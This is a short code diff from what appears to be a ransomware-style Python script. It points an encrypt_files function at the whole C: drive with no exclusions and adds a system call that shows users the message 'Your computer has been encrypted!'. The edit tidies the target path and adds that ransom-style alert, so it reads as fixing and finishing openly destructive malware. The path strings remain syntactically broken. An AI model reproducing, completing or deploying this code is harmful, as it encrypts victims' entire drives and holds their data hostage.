@@ -20,6 +20,7 @@ def encrypt_files(folder, exclusions):
 # Specify the exclusions for files/file extensions to be skipped during encryption
 exclusions = []
 # Replace 'C:/' with the appropriate directory path
-folder_path = 'C:\"
+folder_path = "C:\"
 # Call the encrypt_files function
 encrypt_files(folder_path, exclusions)
+os.system("msg * Your computer has been encrypted!")
